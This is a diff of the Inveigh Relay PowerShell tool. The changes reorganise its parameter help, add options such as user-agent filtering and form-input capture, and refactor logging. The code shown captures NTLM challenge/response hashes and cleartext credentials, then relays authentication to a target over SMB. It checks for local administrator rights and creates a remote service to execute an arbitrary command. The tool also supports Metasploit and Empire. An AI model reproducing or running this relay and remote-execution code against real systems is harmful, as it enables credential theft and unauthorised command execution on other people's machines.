@@ -14,14 +14,35 @@ Invoke-InveighRelay currently supports NTLMv2 HTTP to SMB1/SMB2 relay with psexe
     NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS
     Granular control of console and file output
 
+.PARAMETER Challenge
+Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random
+challenge will be generated for each request. Note that during SMB relay attempts, the challenge will be
+pulled from the SMB relay target. 
+
 .PARAMETER Command
 Command to execute on SMB relay target. Use PowerShell character escapes where necessary.
 
-.PARAMETER Target
-IP address of system to target for SMB relay.
+.PARAMETER ConsoleOutput
+Default = Disabled: (Low/Medium/Y/N) Enable/Disable real time console output. If using this option through a shell, test to
+ensure that it doesn't hang the shell. Medium and Low can be used to reduce output.
 
-.PARAMETER Service
-Default = 20 Character Random: Name of the service to create and delete on the target.
+.PARAMETER ConsoleQueueLimit
+Default = Unlimited: Maximum number of queued up console log entries when not using the real time console.
+
+.PARAMETER ConsoleStatus
+(Integer) Interval in minutes for displaying all unique captured hashes and credentials. This is useful for
+displaying full capture lists when running through a shell that does not have access to the support functions.
+
+.PARAMETER ConsoleUnique
+Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,
+and username combinations when real time console output is enabled.
+
+.PARAMETER FileOutput
+Default = Disabled: (Y/N) Enable/Disable real time file output.
+
+.PARAMETER FileOutputDirectory
+Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must also be
+enabled.
 
 .PARAMETER HTTP
 Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.
@@ -34,8 +55,8 @@ Default = 80: TCP port for the HTTP listener.
 
 .PARAMETER HTTPS
 Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
-the local store and attached to port 443. If the script does not exit gracefully, manually remove the certificate.
-This feature requires local administrator access.
+the local store. If the script does not exit gracefully, manually remove the certificate. This feature requires
+local administrator access.
 
 .PARAMETER HTTPSPort
 Default = 443: TCP port for the HTTPS listener.
@@ -49,17 +70,16 @@ Default = localhost: The subject field for the cert that will be installed for H
 .PARAMETER HTTPSForceCertDelete
 Default = Disabled: (Y/N) Force deletion of an existing certificate that matches HTTPSCertIssuer and HTTPSCertSubject.
 
-.PARAMETER Challenge
-Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random
-challenge will be generated for each request. Note that during SMB relay attempts, the challenge will be
-pulled from the SMB relay target. 
+.PARAMETER LogOutput
+Default = Enabled: (Y/N) Enable/Disable storing log messages in memory.
 
 .PARAMETER MachineAccounts
 Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.
 
-.PARAMETER WPADAuth
-Default = NTLM: (Anonymous,NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
-Anonymous can prevent browser login prompts.
+.PARAMETER OutputStreamOnly
+Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if
+running Inveigh Relay through a shell that does not return other output streams. Note that you will not see the
+various yellow warning messages if enabled.
 
 .PARAMETER ProxyRelay
 Default = Disabled: (Y/N): Enable/Disable relaying proxy authentication.
@@ -78,10 +98,6 @@ cleared. Remove "Firefox" from this list to attack Firefox. If attacking Firefox
 -SpooferRepeat N to limit attacks against a single target so that victims can recover Firefox connectivity by
 closing and reopening.
 
-.PARAMETER Usernames
-Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and
-domain\username format. 
-
 .PARAMETER RelayAutoDisable
 Default = Enable: (Y/N) Enable/Disable automaticaly disabling SMB relay after a successful command execution on
 target.
@@ -89,35 +105,14 @@ target.
 .PARAMETER RelayAutoExit
 Default = Enable: (Y/N) Enable/Disable automaticaly exiting after a relay is disabled due to success or error.
 
-.PARAMETER ConsoleOutput
-Default = Disabled: (Low,Medium,Y,N) Enable/Disable real time console output. If using this option through a shell, test to
-ensure that it doesn't hang the shell. Medium and Low can be used to reduce output.
-
-.PARAMETER ConsoleStatus
-(Integer) Interval in minutes for displaying all unique captured hashes and credentials. This is useful for
-displaying full capture lists when running through a shell that does not have access to the support functions.
-
-.PARAMETER ConsoleUnique
-Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,
-and username combinations when real time console output is enabled.
-
-.PARAMETER FileOutput
-Default = Disabled: (Y/N) Enable/Disable real time file output.
-
-.PARAMETER StatusOutput
-Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.
-
-.PARAMETER OutputStreamOnly
-Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if
-running Inveigh Relay through a shell that does not return other output streams. Note that you will not see the
-various yellow warning messages if enabled.
-
-.PARAMETER OutputDir
-Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must also be
-enabled.
-
 .PARAMETER RunTime
 (Integer) Run time duration in minutes.
+
+.PARAMETER Service
+Default = 20 Character Random: Name of the service to create and delete on the target.
+
+.PARAMETER ShowHelp
+Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
 
 .PARAMETER SMB1
 (Switch) Force SMB1. The default behavior is to perform SMB version negotiation and use SMB2 if supported by the
@@ -126,13 +121,29 @@ target.
 .PARAMETER StartupChecks
 Default = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.
 
-.PARAMETER ShowHelp
-Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
+.PARAMETER StatusOutput
+Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.
+
+.PARAMETER Target
+IP address of system to target for SMB relay.
 
 .PARAMETER Tool
-Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Meterpreter's
+Default = 0: (0/1/2) Enable/Disable features for better operation through external tools such as Meterpreter's
 PowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire.
 0 = None, 1 = Metasploit/Meterpreter, 2 = Empire 
+
+.PARAMETER Usernames
+Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and
+domain\username format. 
+
+.PARAMETER WPADAuth
+Default = NTLM: (Anonymous/NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to
+Anonymous can prevent browser login prompts.
+
+.PARAMETER WPADAuthIgnore
+Default = Disabled: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
+will be skipped for NTLM authentication. This can be used to filter out browsers like Firefox that display login
+popups for authenticated wpad.dat requests such as Firefox.  
 
 .EXAMPLE
 Invoke-Inveigh -HTTP N
@@ -146,39 +157,42 @@ https://github.com/Kevin-Robertson/Inveigh
 [CmdletBinding()]
 param
 ( 
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Proxy = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPSForceCertDelete = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$ConsoleOutput = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleUnique = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelayAutoDisable = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelayAutoExit = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Anonymous","NTLM")][String]$WPADAuth = "NTLM",
-    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
-    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$OutputDir = "",
-    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
-    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = "0.0.0.0",
-    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
     [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
     [parameter(Mandatory=$false)][Array]$Usernames = "",
+    [parameter(Mandatory=$false)][Array]$WPADAuthIgnore = "",
+    [parameter(Mandatory=$false)][Int]$ConsoleQueueLimit = "-1",
     [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
     [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
     [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
     [parameter(Mandatory=$false)][Int]$ProxyPort = "8492",
     [parameter(Mandatory=$false)][Int]$RunTime = "",
+    [parameter(Mandatory=$true)][String]$Command = "",
     [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = "Inveigh",
     [parameter(Mandatory=$false)][String]$HTTPSCertSubject = "localhost",
     [parameter(Mandatory=$false)][String]$Service,
-    [parameter(Mandatory=$true)][String]$Command = "",
     [parameter(Mandatory=$true)][String]$Target = "",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleUnique = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPSForceCertDelete = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LogOutput = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Proxy = "N",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelayAutoDisable = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelayAutoExit = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$ConsoleOutput = "N",
+    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
+    [parameter(Mandatory=$false)][ValidateSet("Anonymous","NTLM")][String]$WPADAuth = "NTLM",
+    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = "",
+    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
     [parameter(Mandatory=$false)][Switch]$SMB1,
+    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
+    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = "0.0.0.0",
     [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
 )
 
@@ -188,30 +202,33 @@ if ($invalid_parameter)
     throw
 }
 
+$inveigh_version = "1.3"
+
 if($ProxyIP -eq '0.0.0.0')
 { 
     $proxy_WPAD_IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
 }
 
-if(!$OutputDir)
+if(!$FileOutputDirectory)
 { 
     $output_directory = $PWD.Path
 }
 else
 {
-    $output_directory = $OutputDir
+    $output_directory = $FileOutputDirectory
 }
 
 if(!$inveigh)
 {
     $global:inveigh = [HashTable]::Synchronized(@{})
+    $inveigh.cleartext_list = New-Object System.Collections.ArrayList
+    $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
     $inveigh.log = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
     $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
     $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList
-    $inveigh.cleartext_list = New-Object System.Collections.ArrayList
-    $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
+    $inveigh.POST_request_list = New-Object System.Collections.ArrayList
     $inveigh.SMBRelay_failed_list = New-Object System.Collections.ArrayList
     $inveigh.valid_host_list = New-Object System.Collections.ArrayList
 }
@@ -224,22 +241,25 @@ if($inveigh.relay_running)
 
 if(!$inveigh.running)
 {
+    $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
     $inveigh.console_queue = New-Object System.Collections.ArrayList
-    $inveigh.status_queue = New-Object System.Collections.ArrayList
+    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
     $inveigh.log_file_queue = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
     $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
-    $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
-    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
-    $inveigh.console_output = $false
+    $inveigh.POST_request_file_queue = New-Object System.Collections.ArrayList
+    $inveigh.status_queue = New-Object System.Collections.ArrayList
     $inveigh.console_input = $true
+    $inveigh.console_output = $false
     $inveigh.file_output = $false
     $inveigh.HTTPS_existing_certificate = $false
     $inveigh.HTTPS_force_certificate_delete = $false
+    $inveigh.log_output = $true
+    $inveigh.cleartext_out_file = $output_directory + "\Inveigh-Cleartext.txt"
     $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
     $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
     $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
-    $inveigh.cleartext_out_file = $output_directory + "\Inveigh-Cleartext.txt"
+    $inveigh.POST_request_out_file = $output_directory + "\Inveigh-FormInput.txt"
 }
 
 if($StartupChecks -eq 'Y')
@@ -298,6 +318,7 @@ elseif($Tool -eq 2) # PowerShell Empire
     $inveigh.output_stream_only = $true
     $inveigh.console_input = $false
     $inveigh.newline = "`n"
+    $LogOutput = "N"
     $ShowHelp = "N"
 
     switch ($ConsoleOutput)
@@ -328,8 +349,22 @@ else
 }
 
 # Write startup messages
-$inveigh.status_queue.Add("Inveigh Relay started at $(Get-Date -format 's')") > $null
-$inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Relay started")]) > $null
+$inveigh.status_queue.Add("Inveigh Relay $inveigh_version started at $(Get-Date -format 's')") > $null
+
+if($FileOutput -eq 'Y')
+{
+    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Relay $inveigh_version started") > $null
+}
+
+if($LogOutput -eq 'Y')
+{
+    $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Relay started") > $null
+    $inveigh.log_output = $true
+}
+else
+{
+    $inveigh.log_output = $false
+}
 
 if($firewall_status)
 {
@@ -351,12 +386,10 @@ if($HTTP -eq 'Y')
     if($HTTP_port_check)
     {
         $HTTP = "N"
-        $inveigh.HTTP = $false
         $inveigh.status_queue.Add("HTTP Capture/Relay Disabled Due To In Use Port $HTTPPort")  > $null
     }
     else
     {
-        $inveigh.HTTP = $true
         $inveigh.status_queue.Add("HTTP Capture/Relay = Enabled")  > $null
 
         if($HTTPIP)
@@ -373,7 +406,6 @@ if($HTTP -eq 'Y')
 }
 else
 {
-    $inveigh.HTTP = $false
     $inveigh.status_queue.Add("HTTP Capture/Relay = Disabled")  > $null
 }
 
@@ -485,6 +517,17 @@ if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
     }
 
     $inveigh.status_queue.Add("WPAD Authentication = $WPADAuth") > $null
+
+    if($WPADAuth -eq "NTLM")
+    {
+        $WPADAuthIgnore = ($WPADAuthIgnore | Where-Object {$_ -and $_.Trim()})
+
+        if($WPADAuthIgnore.Count -gt 0)
+        {
+            $inveigh.status_queue.Add("WPAD NTLM Auth Ignored User Agents = " + ($WPADAuthIgnore -join ","))  > $null
+        }
+
+    }
 
 }
 
@@ -659,7 +702,7 @@ $process_ID = $process_ID -replace "-00-00",""
 
 # Begin ScriptBlocks
 
-# Shared Basic functions ScriptBlock
+# Shared Basic Functions ScriptBlock
 $shared_basic_functions_scriptblock =
 {
 
@@ -692,7 +735,7 @@ $shared_basic_functions_scriptblock =
 
 }
 
-# Irkin functions ScriptBlock
+# Irkin Functions ScriptBlock
 $irkin_functions_scriptblock =
 {
     function ConvertFrom-PacketOrderedDictionary
@@ -1430,7 +1473,7 @@ $irkin_functions_scriptblock =
 
 }
 
-# SMB NTLM functions ScriptBlock - function for parsing NTLM challenge/response
+# SMB NTLM Functions ScriptBlock - function for parsing NTLM challenge
 $SMB_NTLM_functions_scriptblock =
 {
     function SMBNTLMChallenge
@@ -1498,11 +1541,21 @@ $SMB_relay_challenge_scriptblock =
                     if(($SMB_version -eq 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[39]) -eq '0f') -or ($SMB_version -ne 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03'))
                     {
                         $inveigh.console_queue.Add("SMB relay disabled due to SMB signing requirement on $Target")
-                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay disabled due to SMB signing requirement on $Target")])
                         $SMB_relay_socket.Close()
                         $SMB_client_receive = $null
                         $inveigh.SMB_relay = $false
                         $SMB_client_stage = 'exit'
+
+                        if($inveigh.file_output)
+                        {
+                            $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay disabled due to SMB signing requirement on $Target")
+                        }
+
+                        if($inveigh.log_output)
+                        {
+                            $inveigh.log.Add("$(Get-Date -format 's') - SMB relay disabled due to SMB signing requirement on $Target")
+                        }
+
                     }
 
                 }
@@ -1611,22 +1664,42 @@ $SMB_relay_response_scriptblock =
             $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
         }
 
-        $SMB_relay_response_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+        $SMB_relay_response_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
         $SMB_relay_response_stream.Flush()
-        $SMB_relay_response_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+        $SMB_relay_response_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
 
         if(($SMB_version -eq 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[9..12]) -eq '00-00-00-00') -or ($SMB_version -ne 'SMB1' -and [System.BitConverter]::ToString($SMB_client_receive[12..15]) -eq '00-00-00-00'))
         {
             $inveigh.console_queue.Add("$HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target")
-            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target")])   
+            
+            if($inveigh.file_output)
+            {
+                $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target")
+            }
+
+            if($inveigh.log_output)
+            {
+                $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target")
+            }
+              
         }
         else
         {
             $inveigh.console_queue.Add("$HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target")
-            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target")])
             $inveigh.SMBRelay_failed_list.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $Target")
             $SMB_relay_failed = $true
             $SMB_relay_socket.Close()
+
+            if($inveigh.file_output)
+            {
+                $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target")
+            }
+
+            if($inveigh.log_output)
+            {
+                $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target")
+            }
+
         }
 
         if(!$SMB_relay_failed)
@@ -1709,9 +1782,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'CreateAndXRequest'
                         }
                   
@@ -1726,9 +1799,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'RPCBind'
                         }
                 
@@ -1745,9 +1818,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'ReadAndXRequest'
                             $SMB_client_stage_next = 'OpenSCManagerW'
                         }
@@ -1763,9 +1836,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = $SMB_client_stage_next
                         }
                 
@@ -1783,9 +1856,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'ReadAndXRequest'
                             $SMB_client_stage_next = 'CheckAccess'           
                         }
@@ -1796,10 +1869,19 @@ $SMB_relay_response_scriptblock =
                             if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[88..107]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                             {
                                 $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target")])
                                 $SMB_service_manager_context_handle = $SMB_client_receive[88..107]
                                 $packet_SCM_data = Get-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $PsExec_command_bytes $PsExec_command_length_bytes
                                 $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target")
+                                }
 
                                 if($SCM_data.Length -lt $SMB_split_index)
                                 {
@@ -1814,8 +1896,18 @@ $SMB_relay_response_scriptblock =
                             elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '05-00-00-00')
                             {
                                 $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")])
                                 $SMB_relay_failed = $true
+
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target")
+                                }
+
                             }
                             else
                             {
@@ -1838,9 +1930,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             $SMB_client_stage = 'ReadAndXRequest'
                             $SMB_client_stage_next = 'StartServiceW'   
                         }
@@ -1861,9 +1953,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             
                             if($SMB_split_stage_final -le 2)
                             {
@@ -1893,9 +1985,9 @@ $SMB_relay_response_scriptblock =
                             $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                             $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                             $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length)
                             $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length)
                             
                             if($SMB_split_stage -ge $SMB_split_stage_final)
                             {
@@ -1921,9 +2013,9 @@ $SMB_relay_response_scriptblock =
